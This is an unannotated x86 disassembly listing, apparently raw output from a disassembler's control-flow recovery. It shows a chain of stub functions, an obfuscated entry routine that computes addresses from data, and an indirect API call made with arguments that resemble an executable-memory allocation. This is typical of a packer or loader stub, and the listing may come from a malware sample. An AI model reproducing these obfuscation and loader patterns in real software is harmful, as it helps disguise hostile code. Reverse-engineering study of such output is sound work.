0x00401018:	movl	%edi, %edi	; from: 0x0040130c(MAY)
0x0040101a:	pushl	%ebp
0x0040101b:	movl	%esp, %ebp
0x0040101d:	subl	$0x2c, %esp
0x00401020:	pushl	%ebx
0x00401021:	pushl	(%ebx)
0x00401023:	pushl	%edx
0x00401024:	call	0x00401148	; targets: 0x00401148(MAY)
0x00401038:	jb	0x0040104c	; targets: 0x0040103e(MAY), 0x0040104c(MAY)	; from: 0x004010f5(MAY)
0x0040103e:	addb	%al, (%eax)	; from: 0x00401038(MAY)
0x00401040:	addb	%al, (%eax)
0x00401042:	addb	%al, (%eax)
0x00401044:	addb	%al, (%eax)
0x00401046:	addb	%al, (%eax)
0x00401048:	addb	%al, (%eax)
0x0040104a:	addb	%al, (%eax)
0x0040104c:	movl	%edi, %edi	; from: 0x00401038(MAY)
0x0040104e:	pusha	
0x0040104f:	pushl	%ebp
0x00401050:	movl	%esp, %ebp
0x00401052:	subl	$0x58, %esp
0x00401055:	pushl	%ebx
0x00401056:	pushl	%edi
0x00401057:	pushl	%edx
0x00401058:	pushl	(%ebx)
0x0040105a:	call	0x00401300	; targets: 0x00401300(MAY)
0x00401088:	movl	%edi, %edi	; from: 0x004013be(MAY)
0x0040108a:	pushl	%ebp
0x0040108b:	movl	%esp, %ebp
0x0040108d:	subl	$0x38, %esp
0x00401090:	pushl	%ebx
0x00401091:	pushl	(%ebx)
0x00401093:	pushl	(%ebx)
0x00401095:	call	0x00401280	; targets: 0x00401280(MAY)

start:
0x004010c0:	andb	$0x0, %al
0x004010c2:	movzbl	%al, %eax
0x004010c5:	pushl	%eax
0x004010c6:	pushl	$0x4020a2
0x004010cb:	popl	%edi
0x004010cc:	adcl	$0x403002, (%esp)
0x004010d3:	movb	0x1(%edi), %ah
0x004010d6:	movb	(%edi), %al
0x004010d8:	roll	$0x10, %eax
0x004010db:	pushl	0x3a(%eax)
0x004010de:	popl	%edx
0x004010df:	shrl	$0x10, %edx
0x004010e2:	addl	$0x1d, %edx
0x004010e5:	addl	%eax, %edx
0x004010e7:	cmpb	$0x3a, (%edx)
0x004010ea:	jb	0x004010fa	; targets: 0x004010ec(MAY), 0x004010fa(MAY)
0x004010ec:	xorl	%eax, %eax	; from: 0x004010ea(MAY)
0x004010ee:	cmpb	$0x55, (%eax,%edx)
0x004010f2:	ja	0x004010fa	; targets: 0x004010fa(MAY), 0x004010f4(MAY)
0x004010f4:	popl	%ebx	; from: 0x004010f2(MAY)
0x004010f5:	jmp	0x00401038	; targets: 0x00401038(MAY)
0x004010fa:	popl	%ecx	; from: 0x004010f2(MAY), 0x004010ea(MAY)
0x004010fb:	addb	%al, (%eax)
0x004010fd:	addb	%al, 0x43(%edi)
0x00401100:	addb	%al, (%eax)
0x00401102:	addb	%al, (%eax)
0x00401104:	addb	%al, (%eax)
0x00401106:	addb	%al, (%eax)
0x00401108:	addb	%al, (%eax)
0x0040110a:	addb	%al, (%eax)
0x0040110c:	addb	%al, (%eax)
0x0040110e:	addb	%al, (%eax)
0x00401110:	addb	%al, (%eax)
0x00401112:	addb	%al, (%eax)
0x00401114:	addb	%al, (%eax)
0x00401116:	addb	%al, (%eax)
0x00401118:	addb	%al, (%eax)
0x0040111a:	addb	%al, (%eax)
0x0040111c:	addb	%al, (%eax)
0x0040111e:	addb	%al, (%eax)
0x00401120:	addb	%al, (%eax)
0x00401122:	addb	%al, (%eax)
0x00401124:	addb	%al, (%eax)
0x00401126:	addb	%al, (%eax)
0x00401128:	addb	%al, (%eax)
0x0040112a:	addb	%al, (%eax)
0x0040112c:	addb	%al, (%eax)
0x0040112e:	addb	%al, (%eax)
0x00401130:	addb	%al, (%eax)
0x00401132:	addb	%al, (%eax)
0x00401134:	addb	%al, (%eax)
0x00401136:	addb	%al, (%eax)
0x00401138:	addb	%al, (%eax)
0x0040113a:	addb	%al, (%eax)
0x0040113c:	addb	%al, (%eax)
0x0040113e:	addb	%al, (%eax)
0x00401140:	addb	%al, (%eax)
0x00401142:	addb	%al, (%eax)
0x00401144:	addb	%al, (%eax)
0x00401146:	addb	%al, (%eax)
0x00401148:	movl	%edi, %edi	; from: 0x00401024(MAY)
0x0040114a:	pushl	%ebp
0x0040114b:	movl	%esp, %ebp
0x0040114d:	subl	$0x44, %esp
0x00401150:	pushl	%ebx
0x00401151:	pushl	%eax
0x00401152:	pushl	(%ebx)
0x00401154:	pushl	(%ebx)
0x00401156:	call	0x00401178	; targets: 0x00401178(MAY)
0x00401178:	movl	%edi, %edi	; from: 0x00401156(MAY)
0x0040117a:	pushl	%ebp
0x0040117b:	movl	%esp, %ebp
0x0040117d:	subl	$0x38, %esp
0x00401180:	pushl	%ebx
0x00401181:	pushl	(%ebx)
0x00401183:	pushl	%edx
0x00401184:	pushl	%edx
0x00401185:	pushl	(%ebx)
0x00401187:	call	0x004013b0	; targets: 0x004013b0(MAY)
0x004011f0:	movl	%edi, %edi	; from: 0x0040128c(MAY)
0x004011f2:	movl	%esp, %ebp
0x004011f4:	subl	$0x30, %esp
0x004011f7:	movl	$0x40, %edi
0x004011fc:	pushl	%edi
0x004011fd:	movl	$0x1000, %ecx
0x00401202:	pushl	%ecx
0x00401203:	movl	$0x6c0, %edi
0x00401208:	pushl	%edi
0x00401209:	pushl	$0x0
0x0040120b:	leal	0x56ba43a9, %eax
0x00401211:	subl	$0x567a2391, %eax
0x00401216:	pushl	(%eax)
0x00401218:	pushl	$0x402028
0x0040121d:	popl	%eax
0x0040121e:	popl	(%eax)
0x00401220:	decl	(%eax)
0x00401222:	movl	WaitForSingleObject@kernel32.dll, %eax
0x00401227:	call	%eax	; targets: 0xff00020f(MAY)
0x00401280:	movl	%edi, %edi	; from: 0x00401095(MAY)
0x00401282:	pushl	%ebp
0x00401283:	movl	%esp, %ebp
0x00401285:	subl	$0x54, %esp
0x00401288:	pushl	%ebx
0x00401289:	pushl	%eax
0x0040128a:	pushl	(%ebx)
0x0040128c:	call	0x004011f0	; targets: 0x004011f0(MAY)
0x00401300:	movl	%edi, %edi	; from: 0x0040105a(MAY)
0x00401302:	pushl	%ebp
0x00401303:	movl	%esp, %ebp
0x00401305:	subl	$0x5c, %esp
0x00401308:	pushl	%ebx
0x00401309:	pushl	%edx
0x0040130a:	pushl	%edi
0x0040130b:	pushl	%eax
0x0040130c:	call	0x00401018	; targets: 0x00401018(MAY)
0x004013b0:	movl	%edi, %edi	; from: 0x00401187(MAY)
0x004013b2:	pushl	%ebp
0x004013b3:	movl	%esp, %ebp
0x004013b5:	subl	$0x28, %esp
0x004013b8:	pushl	%ebx
0x004013b9:	pushl	(%ebx)
0x004013bb:	pushl	(%ebx)
0x004013bd:	pushl	%esi
0x004013be:	call	0x00401088	; targets: 0x00401088(MAY)
